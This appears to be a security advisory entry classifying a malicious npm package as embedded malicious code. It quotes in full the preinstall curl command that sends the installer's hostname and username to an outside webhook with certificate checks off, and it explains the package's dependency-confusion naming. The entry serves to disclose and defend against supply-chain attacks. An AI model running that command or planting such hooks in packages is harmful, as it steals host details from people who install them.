summary: Preinstall hook exfiltrates host identifiers to external request-logger
details: On `npm install`, the package runs `scripts/preinstall.sh` (declared as the `preinstall` lifecycle hook in package.json). The script executes `curl -s -k -X POST -d "hostname=$(hostname)&user=$(whoami)" https://astralishmx.requestcatcher.com/BONK1`, sending the installer's hostname and current username to a third-party request-logging service (requestcatcher.com is a generic webhook capture host, not the package publisher's infrastructure). TLS certificate verification is explicitly disabled via `curl -k`. The package is published under a scoped name resembling a private organization namespace at version 99.99.99 — the canonical dependency-confusion shape used to intercept internal builds. The combination of preinstall-time outbound beacon to a non-publisher webhook, dependency-confusion-style naming and version, and disabled TLS verification is consistent with a reconnaissance beacon establishing which internal hosts resolve attacker-controlled package names.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
